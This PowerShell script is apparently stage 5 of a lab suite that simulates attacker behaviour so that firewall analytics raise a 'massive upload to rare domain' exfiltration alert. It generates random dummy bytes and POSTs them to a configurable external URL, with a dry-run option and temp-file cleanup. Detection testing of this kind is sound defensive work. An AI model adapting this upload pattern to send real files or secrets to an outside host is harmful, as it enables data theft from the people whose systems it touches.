<#
    Stage 5 - Exfiltration
    ======================
    Uploads a large blob of (dummy) data to an uncommon storage/mail-style
    domain. The firewall sees a big outbound transfer to a rarely-seen
    destination and the EAL analytics flag it:

      -> "Massive upload to a rare storage or mail domain"
         (Exfiltration TA0010 / T1567.002, Informational)

    The payload is random junk generated locally; nothing sensitive leaves
    the host. Point ExfilUrl at an endpoint you control for a clean demo.
#>
param([switch]$DryRun)
. "$PSScriptRoot\..\config\lab-config.ps1"
$cfg = $Global:EalDemo
if ($DryRun) { $cfg.DryRun = $true }

Write-Stage "STAGE 5: Massive upload to rare domain -> $($cfg.ExfilUrl)" "INFO"

$sizeBytes = $cfg.ExfilMegabytes * 1MB
Write-Stage "Generating a $($cfg.ExfilMegabytes) MB dummy payload..." "INFO"

$tmp = Join-Path $env:TEMP "eal_exfil_payload.bin"
try {
    $fs  = [System.IO.File]::Create($tmp)
    $buf = New-Object byte[] (1MB)
    $rng = [System.Random]::new()
    for ($i = 0; $i -lt $cfg.ExfilMegabytes; $i++) {
        $rng.NextBytes($buf)
        $fs.Write($buf, 0, $buf.Length)
    }
    $fs.Close()
    Write-Stage "Payload written to $tmp ($([int]((Get-Item $tmp).Length/1MB)) MB)." "OK"

    if ($cfg.DryRun) {
        Write-Host "  DRY: POST $tmp -> $($cfg.ExfilUrl)"
    } else {
        Write-Stage "Uploading to rare destination (this is the exfil event)..." "INFO"
        try {
            Invoke-WebRequest -Uri $cfg.ExfilUrl -Method Post -InFile $tmp `
                              -ContentType "application/octet-stream" -TimeoutSec 120 -UseBasicParsing | Out-Null
            Write-Stage "  Upload completed." "OK"
        } catch {
            # Even a rejected/failed POST still creates the large outbound
            # flow the firewall logs - the destination + volume is the signal.
            Write-Stage "  Upload endpoint returned an error (traffic still generated): $($_.Exception.Message)" "WARN"
        }
    }
} finally {
    if (Test-Path $tmp) { Remove-Item $tmp -Force -ErrorAction SilentlyContinue }
}
Write-Stage "STAGE 5 done. Expect: 'Massive upload to a rare storage or mail domain'." "OK"
